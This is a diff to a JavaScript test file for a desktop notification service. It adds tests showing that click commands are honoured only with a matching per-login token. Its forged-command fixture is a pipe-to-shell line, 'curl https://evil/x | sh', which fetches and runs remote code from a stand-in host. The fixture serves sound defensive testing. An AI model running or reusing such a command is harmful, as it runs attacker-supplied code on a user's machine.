@@ -214,16 +214,40 @@ assertEqual(notifications.parseExecArgv('["",""]'), null, 'notifications reject 
 // The argv vector rides on the snapshot as the raw JSON string, so the model's
 // value comparison stays a plain string compare and the file round-trip is
 // lossless.
+const execToken = 'a'.repeat(64)
 const execSnapshot = notifications.snapshotOf({
   id: 3,
   appName: 'omarchy-action',
   summary: 'Download complete',
-  hints: { 'omarchy-exec-argv': '["mpv","--","/tmp/clip.mp4"]' }
-}, 1)
+  hints: { 'omarchy-exec-argv': '["mpv","--","/tmp/clip.mp4"]', 'omarchy-exec-token': execToken }
+}, 1, execToken)
 assertEqual(
   execSnapshot.execArgv,
   '["mpv","--","/tmp/clip.mp4"]',
-  'notifications carry the exec argv hint onto the snapshot'
+  'notifications carry the exec argv hint onto the snapshot when its token matches'
+)
+
+// Any session-bus client can set hints, sandboxed apps included, so the argv
+// counts only with the per-login token the sender reads from XDG_RUNTIME_DIR.
+// Everything else shows as a toast with no click command.
+function execArgvOf(hints, shellToken) {
+  return notifications.snapshotOf({ id: 4, appName: 'omarchy-action', summary: 'Forged', hints: hints }, 1, shellToken).execArgv
+}
+const forgedArgv = '["bash","-c","curl https://evil/x | sh"]'
+assertEqual(execArgvOf({ 'omarchy-exec-argv': forgedArgv }, execToken), '', 'notifications drop a click command that carries no token')
+assertEqual(execArgvOf({ 'omarchy-exec-argv': forgedArgv, 'omarchy-exec-token': 'b'.repeat(64) }, execToken), '', 'notifications drop a click command whose token does not match')
+assertEqual(execArgvOf({ 'omarchy-exec-argv': forgedArgv, 'omarchy-exec-token': '' }, ''), '', 'notifications drop every click command while the shell has no token')
+assertEqual(execArgvOf({ 'omarchy-exec-argv': forgedArgv, 'omarchy-exec-token': execToken }, ''), '', 'notifications do not take the token from the hint itself')
+assertEqual(execArgvOf({ 'omarchy-exec-token': execToken }, execToken), '', 'notifications carry no click command from a token alone')
+assertEqual(
+  notifications.replacementSnapshot({ id: 5, hints: { 'omarchy-exec-argv': forgedArgv, 'omarchy-exec-token': execToken } }, 5, 1, execToken).execArgv,
+  forgedArgv,
+  'notifications keep a matching click command through an in-place update'
+)
+assertEqual(
+  notifications.replacementSnapshot({ id: 5, hints: { 'omarchy-exec-argv': forgedArgv } }, 5, 1, execToken).execArgv,
+  '',
+  'notifications drop an unproven click command through an in-place update'
 )
 
 assertDeepEqual(
@@ -763,6 +787,27 @@ assert(
 assert(
   /parseExecArgv\(entry \? entry\.execArgv : ""\)[\s\S]{0,200}?Util\.execArgv\(argv\)/.test(serviceQml),
   'notifications service runs the popup click argv itself instead of a libnotify action'
+)
+// Every snapshot the service takes of a live notification passes the token it
+// read, so no path copies an unproven click command into the model or a file.
+assert(
+  /NotificationLogic\.snapshotOf\(notification, Date\.now\(\), execTokenFor\(notification\)\)/.test(serviceQml),
+  'notifications service snapshots live notifications with the click token'
+)
+const replacementCalls = (serviceQml.match(/NotificationLogic\.replacementSnapshot\(/g) || []).length
+const tokenedReplacementCalls = (serviceQml.match(/NotificationLogic\.replacementSnapshot\([^)]*service\.execTokenFor\(notification\)\)/g) || []).length
+assert(
+  replacementCalls > 0 && replacementCalls === tokenedReplacementCalls,
+  'notifications service passes the click token to every in-place update snapshot',
+  `calls: ${replacementCalls}, with token: ${tokenedReplacementCalls}`
+)
+assert(
+  /execTokenFile\.reload\(\)\s*\n\s*execTokenFile\.waitForJob\(\)/.test(serviceQml),
+  'notifications service waits for the click token read before using it'
+)
+assert(
+  /XDG_RUNTIME_DIR[^\n]*\n[^\n]*omarchy-notification-exec-token/.test(serviceQml),
+  'notifications service reads the click token from the runtime dir the sender mints it in'
 )
 assert(
   /function clear\(\): string \{\s*service\.clearHistory\(\)/.test(serviceQml),
